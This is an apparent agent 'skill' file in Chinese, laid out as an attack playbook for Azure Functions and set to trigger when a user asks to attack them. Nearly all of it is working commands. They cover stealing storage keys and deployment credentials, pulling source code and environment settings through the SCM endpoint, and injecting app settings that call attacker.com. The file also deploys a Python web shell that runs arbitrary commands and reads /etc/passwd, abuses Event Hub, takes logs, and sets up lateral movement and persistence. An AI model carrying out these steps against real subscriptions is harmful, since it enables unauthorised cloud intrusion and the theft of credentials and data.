---
name: azure-functions-attack
type: attack
category: serverless
platform: azure
severity: high
---

# Azure Functions 攻击技能

## 触发条件

- 有 Azure 凭证（Service Principal 或 Access Token）
- 目标使用 Azure Functions
- 用户要求"攻击 Azure Functions"

## 前置检查

```bash
# 1. 登录 Azure
az login

# 2. 设置订阅
az account set --subscription SUBSCRIPTION_ID

# 3. 列出所有函数
az functionapp list --query "[].name" -o tsv
```

## 攻击方法

### 方法 1: 未授权访问

```bash
# 1. 尝试直接访问函数
curl https://FUNCTION_APP.azurewebsites.net/api/FUNCTION_NAME

# 2. 测试常见函数名
for func in "webhook" "export" "import" "process" "admin"; do
  curl https://FUNCTION_APP.azurewebsites.net/api/$func
done

# 3. 测试代码参数
curl "https://FUNCTION_APP.azurewebsites.net/api/FUNCTION_NAME?code=SECRET_CODE"
```

### 方法 2: 存储账户密钥窃取

```bash
# 1. 获取函数应用配置
az functionapp config appsettings list \
  --name FUNCTION_APP \
  --resource-group RESOURCE_GROUP \
  --query "[?contains(name, ' STORAGE')].{Name:name, Value:value}" \
  -o json

# 2. 获取 AzureWebJobsStorage 连接字符串
az functionapp config appsettings list \
  --name FUNCTION_APP \
  --resource-group RESOURCE_GROUP \
  --query "[?name=='AzureWebJobsStorage'].value" -o tsv

# 3. 解析连接字符串获取存储账户名和密钥
# 格式: DefaultEndpointsProtocol=https;AccountName=ACCOUNT;AccountKey=KEY;...
```

### 方法 3: 部署凭证窃取

```bash
# 1. 获取部署凭证
az functionapp deployment list-publishing-profiles \
  --name FUNCTION_APP \
  --resource-group RESOURCE_GROUP

# 2. 使用部署凭证访问
# 获取用户名和密码
USER=$(az functionapp deployment list-publishing-profiles \
  --name FUNCTION_APP --resource-group RESOURCE_GROUP \
  --query "[0].userName" -o tsv)

PASS=$(az functionapp deployment list-publishing-profiles \
  --name FUNCTION_APP --resource-group RESOURCE_GROUP \
  --query "[0].userPWD" -o tsv)

# 3. FTP/FTPS 访问
curl -u $USER:$PASS ftp://FUNCTION_APP.scm.azurewebsites.net/
```

### 方法 4: SCM 端点利用

```bash
# 1. 访问 Kudu 控制台
curl https://FUNCTION_APP.scm.azurewebsites.net/

# 2. 列出所有文件
curl https://FUNCTION_APP.scm.azurewebsites.net/api/vfs/

# 3. 下载源码
curl https://FUNCTION_APP.scm.azurewebsites.net/api/vfs/site/wwwroot/FUNCTION_NAME/function.json -o function.json
curl https://FUNCTION_APP.scm.azurewebsites.net/api/vfs/site/wwwroot/FUNCTION_NAME/__init__.py -o function.py

# 4. 环境变量
curl https://FUNCTION_APP.scm.azurewebsites.net/api/settings
```

### 方法 5: MSI/Managed Identity 利用

```bash
# 1. 检查函数是否启用 Managed Identity
az functionapp identity show \
  --name FUNCTION_APP \
  --resource-group RESOURCE_GROUP

# 2. 如果有，函数内部可以获取 Token
# 通过函数代码执行
curl -X POST https://FUNCTION_APP.azurewebsites.net/api/exploit \
  -H "Content-Type: application/json" \
  -d '{"cmd": "get_token"}'

# 3. 使用获取的 Token 访问其他资源
# 例如: Key Vault, Storage, SQL Database
```

### 方法 6: Application Settings 注入

```bash
# 1. 获取所有应用设置
az functionapp config appsettings list \
  --name FUNCTION_APP \
  --resource-group RESOURCE_GROUP \
  --query "[].{Name:name, Value:value}" -o json

# 2. 修改设置（如果有权限）
az functionapp config appsettings set \
  --name FUNCTION_APP \
  --resource-group RESOURCE_GROUP \
  --settings \
    "MALICIOUS_SETTING=$(curl https://attacker.com/token)" \
    "BACKDOOR_URL=https://attacker.com/webhook"

# 3. 重启函数应用
az functionapp restart \
  --name FUNCTION_APP \
  --resource-group RESOURCE_GROUP
```

### 方法 7: 恶意函数部署

```bash
# 1. 创建恶意函数
cat > exploit.py <<'EOF'
import azure.functions as func
import subprocess
import json

def main(req: func.HttpRequest) -> func.HttpResponse:
    try:
        cmd = req.params.get('cmd') or 'whoami'
        result = subprocess.check_output(cmd, shell=True, text=True)
        return func.HttpResponse(result, status_code=200)
    except Exception as e:
        return func.HttpResponse(str(e), status_code=500)
EOF

# 2. 部署到 Azure
az functionapp function create \
  --function-name exploit \
  --function-name exploit \
  --resource-group RESOURCE_GROUP \
  --function-app FUNCTION_APP

# 3. 调用恶意函数
curl "https://FUNCTION_APP.azurewebsites.net/api/exploit?cmd=cat%20/etc/passwd"
```

### 方法 8: 事件中心/服务总线利用

```bash
# 1. 检查函数的绑定（bindings）
az functionapp config appsettings list \
  --name FUNCTION_APP \
  --resource-group RESOURCE_GROUP \
  --query "[?contains(name, 'EventHub') || contains(name, 'ServiceBus')]" -o json

# 2. 如果有 Event Hub 连接
# 提取连接字符串
EVENTHUB_CS=$(az functionapp config appsettings list \
  --name FUNCTION_APP --resource-group RESOURCE_GROUP \
  --query "[?name=='EventHubConnection'].value" -o tsv)

# 3. 使用连接字符串发送/接收消息
# 需要安装 azure-eventhub
pip install azure-eventhub
python3 <<'EOF'
from azure.eventhub import EventHubProducerClient, EventData
conn_str = "EVENTHUB_CS"
client = EventHubProducerClient.from_connection_string(conn_str)
event_data_batch = client.create_batch()
event_data_batch.add(EventData("malicious payload"))
client.send_batch(event_data_batch)
EOF
```

### 方法 9: 日志和数据窃取

```bash
# 1. 访问 Application Insights（如果启用）
az monitor app-insights component show \
  --app APP_NAME \
  --resource-group RESOURCE_GROUP

# 2. 查询日志
az monitor app-insights query \
  --app APP_NAME \
  --analytics-query "traces | where timestamp > ago(1d) | project message"

# 3. 导出日志
az monitor app-insights query \
  --app APP_NAME \
  --analytics-query "union traces, exceptions, requests | where timestamp > ago(7d)" \
  --offset 0d --interval 1d > /tmp/logs.json
```

### 方法 10: 横向移动

```bash
# 1. 列出同一资源组中的所有函数
az functionapp list \
  --resource-group RESOURCE_GROUP \
  --query "[].name" -o tsv

# 2. 列出所有订阅中的函数
az functionapp list --query "[].{Name:name, RG:resourceGroup}" -o json

# 3. 使用窃取的凭证访问其他函数
# 通过共享的存储账户、密钥等
```

## 验证成功

```bash
# 成功调用函数
curl -w "\nHTTP Status: %{http_code}\n" \
  https://FUNCTION_APP.azurewebsites.net/api/FUNCTION_NAME

# 成功获取设置
az functionapp config appsettings list \
  --name FUNCTION_APP --resource-group RESOURCE_GROUP

# 成功访问 SCM
curl https://FUNCTION_APP.scm.azurewebsites.net/api/vfs/
```

## 下一步

1. 分析函数源码中的密钥
2. 使用窃取的存储账户密钥访问数据
3. 通过函数应用建立持久化
4. 横向移动到其他 Azure 资源
